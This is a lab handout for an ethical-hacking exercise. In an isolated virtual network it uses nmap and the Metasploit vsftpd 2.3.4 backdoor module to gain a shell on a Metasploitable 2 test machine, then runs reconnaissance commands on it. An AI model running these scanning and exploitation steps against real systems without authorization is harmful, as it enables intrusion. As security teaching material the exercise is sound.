# Experiment 2: Simulated Ethical Hacking with Metasploit

## Objective
To perform a safe exploitation exercise on a virtual machine using Metasploit and understand the basic stages of ethical hacking.
Environment
- Kali Linux (Attacker)
- Metasploitable 2 (Victim/Test)
- VirtualBox or VMware
- Host-Only Adapter or Internal Network
## Procedure
1. Configure Virtual Machines
Install Kali Linux and Metasploitable 2, configure both machines with a Host-Only Adapter or Internal Network, and boot them.
2. Verify Network Connectivity
Check the IP address of Metasploitable 2 and verify connectivity from Kali Linux.
ifconfig
ping <Metasploitable_IP>
3. Perform Reconnaissance
Scan Metasploitable 2 to identify open ports, services, and operating system details.
nmap -sS -sV -O <Metasploitable_IP>
4. Save Nmap Results
Save the scan results into a text file.
nmap -sS -sV -O -oN metasploitable_scan.txt <Metasploitable_IP>
5. Launch Metasploit
Start the Metasploit Framework.
msfconsole
6. Search for the Exploit
Search for the vsftpd exploit.
search vsftpd
7. Select the Exploit Module
Select the vsftpd 2.3.4 backdoor exploit module.
use exploit/unix/ftp/vsftpd_234_backdoor
8. Set the Target Host
Set the IP address of the Metasploitable 2 machine.
set RHOST <Metasploitable_IP>
9. Set the Target Port
Set the FTP service port.
set RPORT 21
10. Execute the Exploit
Execute the exploit against the Metasploitable 2 test machine.
exploit
11. Verify the Shell and System Information
Verify the command shell and gather basic system information.
whoami
uname -a
ifconfig
12. Check Processes and Network Services
View running processes and listening network services.
ps aux
netstat -tulnp
13. Create and View a Test File
Create and view a test file on the target machine.
echo "This is a test file" > /tmp/test.txt
cat /tmp/test.txt
Result
The target machine was scanned, a known vulnerable service was identified, and a controlled exploitation exercise was performed using Metasploit in the lab environment.
